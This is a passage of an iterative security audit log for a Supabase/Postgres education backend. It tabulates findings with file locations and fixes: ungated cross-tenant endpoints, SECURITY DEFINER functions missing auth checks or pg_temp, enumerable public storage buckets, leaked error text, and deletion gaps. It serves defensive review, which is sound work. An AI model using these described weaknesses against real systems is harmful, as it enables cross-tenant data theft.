| 5 | LOW-MED | `try_advisory_lock(BIGINT)` / `advisory_unlock(BIGINT)` | `20260319000009:5-22` | SECURITY DEFINER wrappers to `authenticated`. Caller-supplied `lock_key BIGINT` — if any cron/worker uses deterministic fixed key, malicious user acquires it first → DoS pipeline (blocks XP rollovers, summary refreshes, etc.). No namespacing/rate-limit. | `IF lock_key NOT BETWEEN <user-range>` OR revoke from authenticated. |

### SQL body verified clean
- `get_study_queue` v1-v3 — NOT SECURITY DEFINER.
- `get_smart_generate_target` — NOT SECURITY DEFINER.
- `get_student_timeliness_profile` / `get_projected_daily_workload` — explicit `IF p_student_id != auth.uid() THEN RAISE EXCEPTION`.
- `search_scoped` — `auth.uid()` check + memberships CTE; ILIKE wildcards escaped.
- `resolve_student_summary_ids` — EXISTS memberships in body.
- `resolve_parent_institution` / `resolve_summary_institution` — read-only lookups, fail-closed.
- `award_xp` — `SELECT ... FOR UPDATE` + revoked from authenticated.
- `buy_streak_freeze` — `FOR UPDATE` + revoked.
- `increment_bkt_attempts`, `increment_student_stat`, `decrement_streak_freezes` — service_role only.
- `bulk_reorder` `EXECUTE format('%I', p_table)` — safe: `%I` quoting + allowlist.
- Trigger `EXCEPTION WHEN OTHERS THEN RAISE WARNING` — intentional per comments.

### SQL body notes
- **No raw string-concat `EXECUTE '...' || userInput` anywhere.**
- **No hardcoded UUIDs** in any RPC body (grep across 45 files = 0 matches).
- Only two `EXCEPTION WHEN OTHERS` sites, both in triggers (not RPCs), intentional RAISE WARNING.
- Finding #1 (`process_review_batch`) is the single most critical RPC discovered — atomic un-auditable data poisoning across all students.

### Iter 20 totals
- **1 CRITICAL** (`process_review_batch` escalated from iter 15 MED with new exploit detail — trigger pollution + counter poisoning)
- **1 HIGH** (`increment_block_mastery_attempts` escalated)
- **4 MEDIUM** (2 XS-Leaks + bulk_reorder first-id + trash_scoped title leak)
- **1 LOW-MED** (advisory_lock DoS)

**Acumulado tras iter 20**: 5 CRITICAL + 56 HIGH + 79 MED + 14 LOW = 154 findings

---

## Iteration 19 — 2026-04-17 — Trust-RLS-only sweep + Error payload leakage

**Status:** ✓ complete (trust-RLS + error payload)

### Trust-RLS-only anti-pattern sweep (security-scanner)

**Sweep coverage**: ~40 route files; 12 carry `.eq("institution_id", userSuppliedId)` shape; **9 gate correctly, 3 do NOT**.

| # | Severity | Endpoint | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | HIGH | GET /algorithm-config | `routes/settings/algorithm-config.ts:20-86` | Reads `algorithm_config` filtered ONLY by user-supplied `institution_id`. **No `requireInstitutionRole`, no `user.id` anchor.** Any auth user can read any institution's algorithm weights / BKT config. PUT (line 104) does inline membership+role lookup, but GET trusts RLS alone. | Add `await requireInstitutionRole(db, user.id, institutionId, ALL_ROLES)` after UUID validation (line 31). |
| 2 | HIGH | GET /gamification/leaderboard | `routes/gamification/profile.ts:111-152` | Filters `student_xp` by `institution_id` only. **No `requireInstitutionRole`, no self-scope.** Any auth user can enumerate FULL XP roster (student_id, level, weekly XP) of any institution UUID. Cross-tenant roster + XP leak. Sibling endpoints `/profile` (L20) + `/xp-history` (L81) ARE self-scoped. | Add `requireInstitutionRole(db, user.id, institutionId, ALL_ROLES)` after UUID validation (after line 119). |
| 3 | HIGH (write) | POST /ai-generations | `routes/plans/ai-generations.ts:46-72` | Companion to iter-18 GET finding. Inserts `ai_generations` row with user-supplied `body.institution_id`, no `requireInstitutionRole`. Lets any auth user **pollute another institution's audit log + consume their AI quota**. | `requireInstitutionRole(db, user.id, body.institution_id, ALL_ROLES)` after UUID validation (line 53). Same fix as iter-18 GET. |

### Trust-RLS sweep — correctly gated (positive examples)
- `routes/admin/finals-periods.ts` — all 4 handlers call `requireInstitutionRole` before query.
- `routes/content/content-tree.ts:54-104` — H-5 FIX explicitly added.
- `routes/members/memberships.ts:49-74` — H-3 FIX added before `.eq("institution_id", ...)`.
- `routes/ai/weekly-report.ts:39-91` and `routes/ai/report-dashboard.ts:109-189` — gated immediately.
- `routes/ai/ingest.ts:53-72` — PF-02 FIX before any embedding fetch / API spend.
- `routes/gamification/goals.ts` (`/daily-goal`, `/goals/complete`, `/onboarding`) — all 3 gated.

### Trust-RLS sweep notes
- Discriminator applied: handlers filtering `.eq("institution_id", X).eq("student_id"|"user_id", user.id)` are NOT the anti-pattern (self-scoped — RLS misconfig at worst leaks user's own row).
- `routes/settings/messaging-admin.ts` derives `institutionId` server-side via `getUserInstitution(user.id)`. Safe by construction.
- `routes/ai/schedule-agent.ts:460-467` + GET `/ai/schedule-logs` gate `requireInstitutionRole` behind `if (institutionId)`. When omitted, no role check — but underlying ops are self-scoped. Fragile if future edits add inst-wide reads in unguarded branch.
- `algorithm-config.ts` PUT does inline `memberships` lookup vs `requireInstitutionRole` — functionally equivalent. Recommend GET fix use `requireInstitutionRole` for consistency.

### Error payload leakage (security-scanner)

**Scope**: 53 files use `safeErr` correctly; ~11 files bypass it — single sweep PR could remediate.

| # | Severity | File:line | Issue | Fix |
|---|---|---|---|---|
| 1 | **HIGH** | `routes/ai/analyze-graph.ts:124,142,165,176,208` | Raw PostgREST `sumErr/kwErr/connErr/stErr/bktErr.message` returned in 500 body (`Failed to fetch X: ${err.message}`) — leaks schema (column/table names, constraint text). | Replace each `err(c, \`...: ${e.message}\`, 500)` with `safeErr(c, "fetch summaries", e, 500)`. |
| 2 | **HIGH** | `routes/ai/suggest-connections.ts:134,149,164` | Same pattern: raw PostgREST messages in client body. | Switch to `safeErr`. |
| 3 | **HIGH** | `routes/ai/student-weak-points.ts:83,95,108,121` | Same (`sumErr/kwErr/stErr/bktErr.message` returned). | Switch to `safeErr`. |
| 4 | **HIGH** | `routes/study/batch-review.ts:636-642, 651-657` | Direct `c.json({error: \`Atomic batch persistence failed: ${rpcErr.message}\`}, 500)` and `\`...threw: ${(e as Error).message}\``. Leaks RPC name + raw Postgres exception. Bypasses `err()` helper entirely. | Wrap with `safeErr`. |
| 5 | **HIGH** | `routes/ai/pre-generate.ts:410, 440` | Raw `insertErr.message` placed inside `errors[]` array in **success** 201/207 body. Distinct vector — not an error response, but per-item failure list still ships PostgREST text to client. | Map insert errors to sanitised string (`"insert_failed"`); log real `.message` server-side. |
| 6 | MEDIUM | `routes/content/flashcards-by-topic.ts:155-159` | Top-level catch: `\`flashcards-by-topic failed: ${(e as Error).message}\``. Whatever throws inside ends up in client body. | `safeErr(c, "flashcards-by-topic", e instanceof Error ? e : null);` |
| 7 | MEDIUM | `routes/content/flashcard-mappings.ts:133-137` | Same pattern as #6. | `safeErr`. |
| 8 | MEDIUM | `routes/calendar/exam-events.ts:138-139, 197-198` | 404 "Exam event not found" vs 403 "Not authorized" discriminates existence. Iter 11 flagged timing; this is payload-level disclosure (distinct). | Collapse both to 404. |
| 9 | MEDIUM | `routes/schedule/exam-prep.ts:46-47` | Identical 404 vs 403 split. | Same — return 404 in both. |
| 10 | LOW | `routes/calendar/fsrs-calendar.ts:40, 61` | `Workload RPC failed: ${error.message}`. **Iter 6 flagged, re-verified — fix still not landed.** | `safeErr`. |
| 11 | LOW | `routes/content/keyword-connections-batch.ts:154` | **Iter 6 flagged, re-verified — fix still not landed.** | `safeErr`. |

### Error payload verified clean
- `routes/billing/index.ts` (Stripe) — uses `safeErr`. No raw `StripeError.message` reaches client.
- `routes/billing/webhook.ts` + `stripe-client.ts` — `safeErr` wrapped.
- AI rate-limit middleware (`routes/ai/index.ts:108`): full `error.message` only in `console.error`; client gets generic.
- 429 bodies expose only quota cap + `retry_after_ms`. No bucket key / user_id / institution_id.
- `validate.ts` error strings are caller-supplied (`msg`); no regex/schema exposure.
- `lib/safe-error.ts` correct contract: full detail server-side, generic to client.
- **PostgREST `error.details`/`error.hint`/`error.code` — 0 matches** in any client response.
- **`error.stack` — 0 matches** in any return / `c.json` payload.
- No `throw new HTTPException(...)` anywhere in backend.

### Error payload notes
- 11 findings cluster into 3 patterns: (a) `${err.message}` interpolated into `err()` after Supabase call, (b) direct `c.json({ error: ... })` bypassing helper (only batch-review.ts), (c) per-item error fields inside success bodies (pre-generate.ts).
- **Iter 6 fixes for `fsrs-calendar.ts` + `keyword-connections-batch.ts` STILL NOT LANDED** — 5 days later, review comments posted but no commits. Patterns persist unchanged.
- Recommend single sweeping fix PR: `err(c, \`X failed: ${e.message}\`, 500)` → `safeErr(c, "X", e, 500)`. Helper already exists.

### Iter 19 totals
- **8 HIGH** (3 trust-RLS + 5 error payload)
- **4 MEDIUM** (4 error payload)
- **2 LOW** (2 iter-6 re-confirmations)

**Acumulado tras iter 19**: 4 CRITICAL + 55 HIGH + 75 MED + 13 LOW = 147 findings actionable

---

## Iteration 18 — 2026-04-17 — Blind-spot tables + CREATE OR REPLACE regression sweep

**Status:** ✓ complete (blind-spot + CREATE OR REPLACE sweep)

### Blind-spot tables inferred audit (security-scanner)

**13 Dashboard-managed tables NOT in migrations** (profiles, memberships, institutions, flashcards, reviews, fsrs_states, bkt_states, chunks, summaries, quiz_questions, quiz_attempts, study_sessions, ai_generations). Can't audit DDL directly — inferred RLS assumptions from TS callers. **Every finding below becomes HIGH-to-CRITICAL if the assumption is wrong.**

#### RLS assumptions the code depends on

| # | Table | Caller | Assumed RLS | If wrong → |
|---|---|---|---|---|
| 1 | `ai_generations` | `routes/plans/ai-generations.ts:27` GET — `.eq("institution_id", institutionId)` **NO `requireInstitutionRole`** | SELECT allowed only when institution_id matches active membership | **CRITICAL**: any auth user passes any UUID → exfil AI generation logs (prompts, costs, tokens) per tenant |
| 2 | `profiles` | `routes/whatsapp/handler.ts:273`, `routes/telegram/handler.ts:203` — SELECT `full_name` for userId ≠ `auth.uid()` via bot's JWT (not admin) | SELECT for `id = auth.uid()` OR same-institution user | **CRITICAL**: if permissive, any auth user SELECTs any profile → full PII enumeration (email, full_name, avatar_url) |
| 3 | `flashcards` | `flashcards-by-topic.ts:132` — `.in("summary_id", summaryIds)` NO student_id filter | summary_id belongs to caller's institution | **HIGH**: if RLS only checks student_id, returns 0 rows (breaks UX); if permissive, all cards cross-tenant leak |
| 4 | `memberships` | `auth-helpers.ts:166` `resolveCallerRole` | `user_id = auth.uid()` OR `institution_id` in caller's memberships | **HIGH**: too narrow breaks auth stack; too permissive = cross-tenant membership enumeration |
| 5 | `chunks` | `routes/ai/chat/retrieval.ts:45` — `.in("id", matchedIds)` via user JWT | `summary_id` in caller's institution | **HIGH**: embeddings are institutional IP; permissive RLS → read all tenants' course content |
| 6 | `fsrs_states` / `bkt_states` | 11 callers all use `.eq("student_id", user.id)` defense-in-depth | `student_id = auth.uid()` only | **HIGH**: new route forgetting the filter + permissive RLS → all students' learning state leak |
| 7 | `quiz_attempts` | `routes/study/reviews.ts:185,235` — defense-in-depth | `student_id = auth.uid()` only | **HIGH**: same as fsrs/bkt |
| 8 | `summaries` | dozens of callers, inconsistent scoping | `institution_id` in caller's active memberships | **HIGH**: core content table; inconsistent scoping means RLS is the only universal guarantee |
| 9 | `study_sessions` | `routes/_messaging/review-flow-base.ts:146` INSERT with bot-side JWT | INSERT requires `student_id = auth.uid()` | **HIGH**: permissive INSERT → malicious user creates sessions attributed to other students, pollutes learning history |
| 10 | `quiz_questions` | `routes/study/batch-review.ts:343` — `.in("id", ...)` no further filter | `summary_id` in caller's institution | MEDIUM |
| 11 | `reviews` | app-layer `verifySessionOwnership` before queries | `session_id` belongs to session owned by `auth.uid()` | MEDIUM |
| 12 | `institutions` | `institutions.ts:127` GET via user JWT | institutions where caller has active membership | MEDIUM (metadata only — name/logo, no PII) |

#### Cross-caller inconsistencies (tangible findings)

| # | Table | Issue | Fix |
|---|---|---|---|
| 1 | `flashcards` | **Two incompatible column sets in code.** Set A (flashcards-by-topic, study-queue, flashcards routes): `id, summary_id, keyword_id, subtopic_id, front, back, ...` (institutional content). Set B (schedule/momentum.ts:108-112, exam-prep.ts:71-75): `student_id, course_id, stability, difficulty, state, next_review_at` (per-student FSRS). Mutually exclusive schemas. Either Set B is dead/broken OR `flashcards` has both (denormalized per-student rows) and Set A leaks other students under permissive RLS. | Export actual DDL. If per-student: every Set A query needs `.eq("student_id", user.id)`. If institutional: delete Set B. |
| 2 | `ai_generations` | GET (line 27) NO `requireInstitutionRole`; POST (line 69) same pattern. Compare with `memberships` LIST which calls `requireInstitutionRole` first. | Add `requireInstitutionRole(db, user.id, institutionId, MANAGEMENT_ROLES)` — cost data is admin-only. |
| 3 | `profiles` cross-user reads in messaging | TG/WA handlers SELECT `profiles` for userId ≠ auth.uid() via bot's `db` (not admin). If works in prod = RLS permissive. | Switch to `getAdminClient()` + tighten RLS to `id = auth.uid()`. |

#### Recommendations
- **CRITICAL**: run `SELECT schemaname, tablename, policyname, cmd, qual FROM pg_policies WHERE tablename IN (...)` on live DB and feed back to audit. Every assumption above is unverifiable from migrations alone.
- Export `flashcards` DDL to resolve Set A vs Set B.
- Backfill missing `requireInstitutionRole` in `routes/plans/ai-generations.ts` GET+POST.
- Move cross-user `profiles` SELECTs in messaging to admin client + lock down RLS to own-only.
- Add integration test: with JWT for tenant A, attempt SELECT on each of 13 tables filtered by tenant B IDs → expect empty / 403. Converts assumptions into automated assertions.

### CREATE OR REPLACE / ALTER FUNCTION regression sweep (security-scanner)

**🔑 Root cause discovered**: PostgreSQL's `CREATE OR REPLACE FUNCTION` **REPLACES the per-function `proconfig`** (search_path, etc.) using the new declaration. Any prior `ALTER FUNCTION ... SET search_path` is **silently dropped** if the new CREATE doesn't restate it. This is the systemic cause of the 3+ regressions discovered across iter 17+18.

| # | Function | Earlier version | Later version | What was silently weakened | Fix |
|---|---|---|---|---|---|
| 1 | `resolve_parent_institution(text,uuid)` | `20260319000002` ALTER set `search_path = public, pg_temp` (hardening) | `20260319000008_simplify_denorm_rpcs.sql` CREATE OR REPLACE with `SET search_path = public` only | **`pg_temp` dropped** → temp-schema hijack window reopened on SECURITY DEFINER function reachable via PostgREST (granted to `authenticated`) | Re-issue `ALTER FUNCTION resolve_parent_institution(text, uuid) SET search_path = public, pg_temp;` |
| 2 | `get_institution_summary_ids(uuid)` (2nd event) | `20260311000003` LANGUAGE plpgsql + `auth.uid()` check + `search_path = public, pg_temp` | `20260319000008` LANGUAGE sql, no auth check, `search_path = public` | Same regression as iter 17 #x, BUT `pg_temp` was ALSO dropped. Iter 17 remediation must restore BOTH auth check AND `public, pg_temp`. | Rewrite `_008` in plpgsql, restore auth/membership check, set `search_path = public, pg_temp`. |
| 3 | `rag_hybrid_search(vector(768), text, uuid, uuid, int, float)` orphan | `20260307000001` defined LANGUAGE plpgsql, SECURITY DEFINER, no search_path, default grants to `authenticated`/`anon` | `20260311000001` created SECOND function `vector(1536)` without DROPping 768 signature; `20260311000003` only REVOKE-d 1536 signature | **768-dim orphan persists in pg_proc** with original public/authenticated grants, no search_path, no auth check — callable via PostgREST RPC despite later hardening pass. After ALTER COLUMN it errors at execution but still discoverable. | `DROP FUNCTION IF EXISTS rag_hybrid_search(vector(768), text, uuid, uuid, int, float);` — same DROP pattern used for `rag_coarse_to_fine_search` 5-param. |

### Silent no-ops (ALTER targeting wrong signature)
- `20260401_01_security_definer_remaining.sql:34` — `ALTER FUNCTION trash_scoped(uuid)`; actual = `(text, int)`. Already noted iter 17.
- `20260401_01_security_definer_remaining.sql:26` — `ALTER FUNCTION search_scoped(text, uuid, int)`; actual = `(text, text, int)`. Wrapping `DO $$ ... IF EXISTS ...` only checks name, then `EXECUTE` against wrong signature → raises `function does not exist`, aborting migration if no `BEGIN/EXCEPTION`. NEW silent no-op. Remediated later by `20260404000010` but hardening absent for ~3 days.

### Regression sweep verified clean
- `bulk_reorder`, `rag_coarse_to_fine_search`, `search_keywords_by_institution`, `upsert_video_view`, `get_student_knowledge_context`, `get_course_summary_ids`, `rag_analytics_summary`, `rag_embedding_coverage`, `get_ai_report_stats`, `resolve_summary_institution`, `search_scoped`, `trash_scoped`, `sync_summary_institution_id` — all body-strictly-strengthened or body-unchanged across versions.
- Grant-reset via DROP+CREATE signature change: properly re-issued for `rag_coarse_to_fine_search`, `bulk_reorder`, `get_study_queue` — all CLEAN.

### 🚨 Systemic CI recommendation
**The single highest-leverage rule**: any `CREATE OR REPLACE FUNCTION` with `SECURITY DEFINER` MUST include `SET search_path = public, pg_temp` in the CREATE statement itself. Prior `ALTER FUNCTION` hardening is SILENTLY lost by Postgres semantics.

Add CI grep: for each migration, flag `CREATE OR REPLACE FUNCTION` blocks that contain `SECURITY DEFINER` but lack `SET search_path` within the same block. Currently `_008` violates this for 2 functions.

### Inconsistency observed
`20260319000008` writes `SET search_path = public` (no `pg_temp`), while 14 other migrations use `public, pg_temp`. Standardize on `public, pg_temp`.

### Iter 18 totals
**Blind-spot tables (actionable only)**: 3 cross-caller inconsistencies (1 CRITICAL `ai_generations` + 1 CRITICAL `profiles` + 1 MED `flashcards` schema)
**Blind-spot tables (conditional on RLS state — if RLS not verified)**: 7 HIGH + 3 MED potential
**CREATE OR REPLACE sweep**: 3 regressions (2 HIGH search_path loss, 1 HIGH orphan function) + 1 silent no-op (search_scoped)

**Acumulado tras iter 18 (actionable-only)**: 4 CRITICAL + 40 HIGH + 68 MED + 11 LOW = 123 findings
**Acumulado tras iter 18 (including RLS-conditional)**: 4 CRITICAL + 47 HIGH + 71 MED + 11 LOW = 133 findings

---

## Iteration 17 — 2026-04-17 — Re-audit iter 1 SAFE list + Deletion cascade

**Status:** ✓ complete (deletion + re-audit)

### Deletion cascade + orphaned data (security-scanner)

| # | Severity | Table / action | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | HIGH | DELETE /me endpoint | `routes-auth.ts` (entire) | Re-confirmed iter 11: NO endpoint to delete a user account. `auth.admin.deleteUser` only used as signup rollback. **GDPR/CCPA "right to erasure" gap.** | Add `DELETE /me` handler that calls `purge_user(uuid)` RPC purging every user-scoped table, then `auth.admin.deleteUser`. |
| 2 | HIGH | `rag_query_log.user_id` | `migrations/20260305000005_rag_query_log.sql:22` | `REFERENCES auth.users(id)` with NO ON DELETE → defaults to NO ACTION. **Contains raw `query_text` (PII / chat content)**. If user delete added later, will fail; meanwhile chat queries persist forever with no retention job. | `ON DELETE CASCADE` + pg_cron retention (e.g. 90 days) similar to whatsapp_message_log. |
| 3 | HIGH | `ai_schedule_logs.student_id` | `migrations/20260319000010_ai_schedule_logs.sql:6` | `student_id UUID NOT NULL` declared with **NO foreign key at all**. Rows orphan silently on user delete; no retention. error_message column may include user input. | Add FK `ON DELETE CASCADE` + retention pg_cron. |
| 4 | HIGH | `ai_content_reports.reviewed_by` | `migrations/20260308000002:56` | `REFERENCES auth.users(id)` no ON DELETE. NO ACTION default — blocks future user purge. (`reporter_id` line 42 is CASCADE; this `reviewed_by` is the gap.) | `ON DELETE SET NULL` on reviewed_by (preserve audit). |
| 5 | HIGH | flashcards soft-delete (no orphan cleanup) | `routes-student.ts:28-41`; `crud-factory.ts:506` | Deleting flashcard sets `deleted_at` but no `cascadeChildren` to `reviews` / `fsrs_states`. Reviews + FSRS scheduler state remain referencing tombstoned flashcard. `xp_transactions.source_id` (uuid, no FK) also dangles. Same pattern for `quiz_questions` → `quiz_attempts`. | Add cascade soft-delete: flashcards → [reviews, fsrs_states, bkt_states (via subtopic_id), block_mastery_states]; quiz_questions → [quiz_attempts]. |
| 6 | HIGH | summaries soft-delete → chunks | `routes/content/crud.ts:87-107` | Summary delete has no `cascadeChildren` for `chunks` (chunks have no soft-delete and FK shown isn't CASCADE in repo). **Embeddings persist in pgvector index referencing dead summary**; rag_query_log.summary_id (no ON DELETE) breaks. | Add `cascadeChildren: [{ table: "chunks", fk: "summary_id" }]` and confirm chunks.summary_id FK is `ON DELETE CASCADE`. Make rag_query_log.summary_id `ON DELETE SET NULL`. |
| 7 | MEDIUM | Membership soft-delete keeps full PII visible | `routes/members/memberships.ts:287-294` | DELETE only sets `is_active=false`. Tenant admin still sees ex-student's XP, reviews, weekly_reports, telegram_links, study sessions. No "right to be forgotten" path inside a tenant. | Hard-purge admin action that nullifies/anonymizes student-owned rows for that institution. |
| 8 | MEDIUM | Institution `is_active=false` does NOT revoke content access | `routes/members/institutions.ts:179-197`; `auth-helpers.ts` | Deactivation only hides institution from GET list. **RLS helpers check `memberships.is_active`, NOT `institutions.is_active`** — no migration filters on institutions.is_active. Members keep reading/writing content of "deleted" institution. | Add `institutions.is_active = TRUE` predicate to `user_institution_ids()`, OR cascade `is_active=false` to memberships on institution deactivate. |
| 9 | MEDIUM | No deletion audit trail | global | grep `audit / deletion_log / deleted_by` → 0 matches. Soft-deletes record `deleted_at` but not `deleted_by`. Membership deactivation logs to `console.warn` only (not durable). | Add `deleted_by uuid` to soft-delete tables OR `audit_log(actor, action, target_table, target_id, ts)` table written from crud-factory + admin routes. |
| 10 | LOW | `algorithm_config.updated_by`, `finals_periods.created_by`, `messaging_admin_settings.updated_by` | `migrations/20260304000001:32`, `20260402000003:13`, `20260316000002:138` | All `REFERENCES auth.users/profiles(id)` with NO ON DELETE. Same default-NO-ACTION class as #2/#4. | `ON DELETE SET NULL`. |

### Deletion cascade verified clean
- video_views.user_id ON DELETE CASCADE
- whatsapp_links.user_id, telegram_links.user_id ON DELETE CASCADE
- whatsapp_sessions / telegram_sessions / telegram_message_log.user_id ON DELETE SET NULL (PII-light)
- exam_events.student_id, weekly_reports.student_id, sticky_notes.student_id ON DELETE CASCADE
- student_xp.student_id, xp_transactions.student_id, ai_content_reports.reporter_id ON DELETE CASCADE
- whatsapp_message_log + telegram_message_log: 30-day pg_cron retention
- Content hierarchy soft-delete cascade course → semesters → sections → topics → summaries works through crud-factory.

### Deletion cascade notes
- Cannot inspect `profiles`, `memberships`, `institutions`, `flashcards`, `reviews`, `fsrs_states`, `bkt_states`, `chunks`, `summaries`, `quiz_questions`, `quiz_attempts`, `study_sessions` cascade behavior — **NOT defined in `supabase/migrations/`** (created via Dashboard / pre-repo). Strong recommendation: dump live schema and audit FK ON DELETE table-by-table; findings #5/#6/#8 assume worst-case and need live-DB confirmation.
- `ai_generations` table referenced by RLS (20260319000016:148) but no CREATE TABLE in repo — same blind spot.
- Items 2, 3, 6 also break if user purge is ever shipped (item 1) — fix order matters.

### Re-audit of iter 1 #198 SAFE list (body-reading, security-scanner)

**Verdict**: iter 1 audit was materially incomplete. Re-audit by body-reading finds 2 HIGH + 1 MED + 2 silent regressions + 6 phantom RPCs.

| # | RPC | Claim (iter 1) | Reality (body + grants) | Sev | Fix |
|---|---|---|---|---|---|
| 1 | `upsert_video_view(...)` | service_role-only | Original grant `anon, authenticated` (20260227000003). 20260402_01 only `REVOKE … FROM authenticated`. **`anon` STILL holds EXECUTE.** Body trusts `p_user_id` with no `auth.uid()` check — anon can insert/upsert `video_views` for arbitrary user_id. | **HIGH** | `REVOKE EXECUTE ON FUNCTION upsert_video_view(...) FROM anon;` (same finding as iter 15 #4 — reconfirmed). |
| 2 | `resolve_student_summary_ids(UUID, UUID)` | service_role-only | 20260319000013 grants to `authenticated`, never revoked. **Body filters `WHERE m.user_id = p_student_id`, NOT `auth.uid()`.** Any auth user can pass any `p_student_id` and enumerate that student's accessible published summary IDs in any institution. | **HIGH** | Replace `m.user_id = p_student_id` with `auth.uid()`, OR guard `IF p_student_id <> auth.uid() THEN RAISE 'forbidden'`, OR `REVOKE FROM authenticated`. |
| 3 | `resolve_parent_institution(text, uuid)` | service_role-only | 20260319000008 permissive; 20260405000001 explicitly `GRANT EXECUTE … TO authenticated; … TO anon;`. Body no auth check, returns institution_id for any p_id (14 tables). **Same shape as iter-15 `search_keywords_by_institution`**. | MEDIUM | `REVOKE EXECUTE FROM anon;` min. Re-evaluate why crud-factory needed `authenticated` grant. |
| 4 | `trash_scoped(text, integer)` | service_role-only | 20260304000003 + 20260319000015 grant to `authenticated`, never revoked. **Functionally SAFE** (body uses `auth.uid()` via `user_institutions` CTE). Misclassification only. | LOW | Reclassify docs to GROUP 2. |

### Silent regressions (body weakening without grant change)
- **`get_institution_summary_ids(UUID)`**: 20260311000003 added internal `auth.uid() → membership` defense-in-depth check. 20260319000008 did `CREATE OR REPLACE` **reverting to `LANGUAGE sql` and DROPPED the auth.uid() check**. Grants survived — still service_role-only so net SAFE, but Layer 2 silently removed. **Restore the `IF auth.uid() IS NOT NULL THEN … END IF` block.**
- **`trash_scoped` ALTER targeting wrong signature**: 20260401_01 attempted `ALTER FUNCTION trash_scoped(uuid)` but real signatures are `(text,int)`. **DO-block silently no-ops; search_path hardening NEVER actually applied to the live function**. Re-issue with correct signature.

### Phantom RPCs (NOT in migrations — iter 1 SAFE list was from pg_proc snapshot, not code)
- `compute_cohort_difficulty`, `increment_daily_stat`, `refresh_leaderboard_weekly`, `reset_correct_streak`, `create_text_annotation`, `find_similar_topics`
- Case-insensitive grep across whole repo finds them only in frontend (`studentSummariesApi.ts`), planning docs, and conversation logs — **never as `CREATE FUNCTION`**.
- **Verify against live DB**; if present they need their own body+grant audit; if absent, drop from SAFE list as phantom entries.

### Re-audit verified truly safe
- `award_xp` — REVOKEd from authenticated + anon; service_role only.
- `get_ai_report_stats`, `get_student_knowledge_context`, `rag_analytics_summary`, `rag_embedding_coverage`, `get_course_summary_ids` — all REVOKEd from anon+authenticated.
- `on_review_inserted`, `on_study_session_completed` — trigger functions, not PostgREST-callable.
- `user_institution_ids()` — body correctly uses `auth.uid()`, returns only caller's memberships. SAFE.
- `try_advisory_lock` / `advisory_unlock` — thin wrappers, no user/inst data exposed. Reclassify as "primitive wrapper".

### Re-audit cross-cutting lesson
Relying on commented intent (`-- service_role-only`) without verifying live grant state misses:
(a) anon-only leftovers from `GRANT … TO anon, authenticated` followed by partial revokes
(b) later `GRANT … TO anon/authenticated` migrations for unrelated callers
(c) `CREATE OR REPLACE` body weakenings that preserve grants
**All three patterns recur.** The iter-1 SAFE list should be regenerated from `pg_proc` + `has_function_privilege` queries against the live DB, not from migration commentary.

### Iter 17 totals
- **8 HIGH** (6 deletion + 2 re-audit)
- **4 MEDIUM** (3 deletion + 1 re-audit)
- **2 LOW** (1 deletion + 1 re-audit)
- **2 silent regressions** (body weakening, signature mismatch)
- **6 phantom RPCs** (need live-DB verification)

**Acumulado tras iter 17: 2 CRITICAL + 37 HIGH + 67 MED + 11 LOW = 117 findings**

---

## Iteration 16 — 2026-04-17 — Schema-wide grant audit + Storage signed URLs

**Status:** ✓ complete (storage + schema-wide)

### Storage signed URLs + bucket access (security-scanner)

**Pattern discovered**: 4 buckets are `public:true` + deterministic or weak-entropy paths → **UNAUTH cross-tenant data exfil with zero computation**.

| # | Severity | Bucket | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | **CRITICAL** | `flashcard-images` | `flashcard-image-generator.ts:120` | Path = `${institutionId}/${flashcardId}/original.png`. **Zero random component.** Bucket `public:true`, served via `getPublicUrl()` (never signed). Flashcard UUIDs leak via API responses to any auth user; institution IDs visible client-side. Anyone knowing/guessing tuple can enumerate every flashcard image cross-tenant. | `public:false` + `createSignedUrl` with 1h TTL. |
| 2 | **CRITICAL** | `infographic-images` | `infographic-image-generator.ts:274-278, 314, 329-331` | `createBucket(..., {public:true})` + path `${institutionId}/${summaryId}/${conceptIndex}.png` (conceptIndex = small int). Institution IDs are not confidential; summary IDs round-trip to clients. Cross-tenant infographic exfil via URL enumeration. | Same: `public:false` + `createSignedUrl`. |
| 3 | **HIGH** | `axon-images` | `routes-storage.ts:153` | Path uses `Math.random().toString(36).substring(2,6)` — ~30 bits PRNG, NOT CSPRNG. Combined with `timestamp = Date.now()` (seconds-window known after upload) and `public:true`, attacker learning one URL can bruteforce sibling paths. Backend hands back `signedUrl` but frontend constructs `/object/public/` URL directly (`ProseForm.tsx:58`, `ImageReferenceForm.tsx:51`, `FlashcardImageUpload.tsx:103`) — **signing is cosmetic security theater**. | Replace with `crypto.randomUUID()`. Return ONLY `path`; frontend must round-trip through `/storage/signed-url` (route already does ownership checks). |
| 4 | **HIGH** | `axon-models-3d` | `routes-models.ts:250-253, 322, 343-345` | `createBucket(..., {public:true})` AND **no `allowedMimeTypes`**. `Math.random()` entropy. 100 MB `.glb/.gltf` files served unsigned and enumerable. 3D model IPs (proprietary anatomy rigs) leak cross-tenant; public CDN for arbitrary 100 MB attacker-authored binaries. | `public:false` + signed URLs; `crypto.randomUUID()`; institution-scoped path prefix. |

### Storage verified clean
- `SIGNED_URL_EXPIRY = 3600` (1h) — within threshold; no `31536000` TTLs anywhere.
- No `supabase.storage.list()` callable by anon/authenticated.
- Signed URLs NOT cached past TTL in localStorage/IndexedDB.
- Ownership check on batch+single `createSignedUrl` correctly requires `/${user.id}/` in path.
- Webhook URLs auth via signature, not URL secrecy.
- GLB magic-byte check present.

### Storage notes
- Findings #1 + #2 are **strictly stronger than #3/#4** — path has ZERO random component, public-bucket decision alone makes them enumerable.
- **Backend signed-URL response for `axon-images` is cosmetic theater**: 3 frontend call-sites bypass signing entirely by constructing `${SUPABASE_URL}/storage/v1/object/public/...` directly. Either make bucket private OR stop pretending to sign.
- Same anti-pattern as iter 1 #242 but extended across 4 buckets.
- Signed URL secret rotation: Supabase handles; 1h TTL bounds impact.

### Schema-wide grant + RLS audit (security-scanner)

**Verdict**: 0 HIGH/CRITICAL. No explicit `GRANT SELECT ... TO anon/authenticated` on any TABLE/VIEW/MV found; all multi-tenant tables have RLS with institution-scoped policies; all service-only tables have `auth.role() = 'service_role'` gates.

| # | Severity | Object | Migration:line | Issue | Fix |
|---|---|---|---|---|---|
